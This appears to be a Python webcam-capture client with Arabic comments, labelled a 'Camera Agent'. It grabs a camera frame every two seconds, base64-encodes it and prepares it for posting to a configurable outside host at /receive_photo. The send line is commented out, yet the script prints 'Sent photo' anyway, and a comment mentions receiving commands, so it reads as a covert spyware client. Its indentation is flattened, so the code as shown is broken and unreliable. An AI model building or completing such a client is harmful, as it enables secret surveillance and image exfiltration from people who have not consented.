import time
import requests
import os
import base64
import cv2

# --- إعداداتك ---
# ملحوظة: يجب أن يكون الرابط هو موقعك الشخصي
YOUR_HOST_URL = "http://192.168.1.5:5000" # اذا كنت على نفس الشبكة
# أو استخدم رابط الويب الخاص بك:
# YOUR_HOST_URL = "https://saher254.github.io"

# --- وظيفة الالتقاط ---
def capture_and_send():
 print("[*] Camera Agent started...")
 
 # كشف الكاميرا
 cap = cv2.VideoCapture(0)
 
 while True:
 try:
 ret, frame = cap.read()
 if ret:
 # تحويل الصورة لمصفوفة بايت
 _, buffer = cv2.imencode('.jpg', frame)
 img_str = base64.b64encode(buffer).decode('utf-8')
 
 # إرسال الصورة لسيرفرك
 payload = {
 "image": img_str,
 "source": "remote_client"
 }
 
 # هنا يتم إرسال الصورة للسيرفر الخاص بك
 # requests.post(f"{YOUR_HOST_URL}/receive_photo", json=payload)
 
 print(f"[+] Sent photo {time.time()}")
 
 time.sleep(2) # كل 2 ثانية صورة جديدة
 except Exception as e:
 print(f"[-] Error: {e}")
 break
 
 cap.release()

if __name__ == "__main__":
 # تشغيل السيرفر الخاص بالعميل لاستقبال الأوامر
 capture_and_send()